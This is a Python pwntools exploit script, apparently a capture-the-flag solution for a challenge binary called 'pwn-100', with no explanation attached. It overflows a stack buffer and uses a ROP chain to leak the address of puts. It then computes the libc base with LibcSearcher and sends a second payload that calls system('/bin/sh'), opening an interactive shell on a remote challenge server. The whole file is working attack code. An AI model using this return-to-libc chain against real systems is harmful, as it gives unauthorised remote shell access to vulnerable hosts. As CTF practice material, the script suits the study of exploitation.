import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./pwn-100')
p = pwn.remote('220.249.52.133', 40833)
e = pwn.ELF('./pwn-100')

main_addr = pwn.p64(0x4006B8)
puts_plt = pwn.p64(e.plt['puts'])
puts_got = pwn.p64(e.got['puts'])

pop_rdi_addr = pwn.p64(0x400763)

payload1 = b'A' * 0x40 + b'B' * 8 + pop_rdi_addr + puts_got + puts_plt + main_addr
payload1 += b'C' * (200 - len(payload1))
p.sendline(payload1)
p.recvuntil(b'bye~\n')
puts_addr = pwn.u64(p.recv(6) + b'\x00\x00')

import LibcSearcher

libc = LibcSearcher.LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = pwn.p64(libc_base + libc.dump('system'))
sh_addr = pwn.p64(libc_base + libc.dump('str_bin_sh'))

payload2 = b'A' * 0x40 + b'B' * 8 + pop_rdi_addr + sh_addr + system_addr
payload2 += b'C' * (200 - len(payload2))

p.sendline(payload2)
p.recv()
p.interactive()
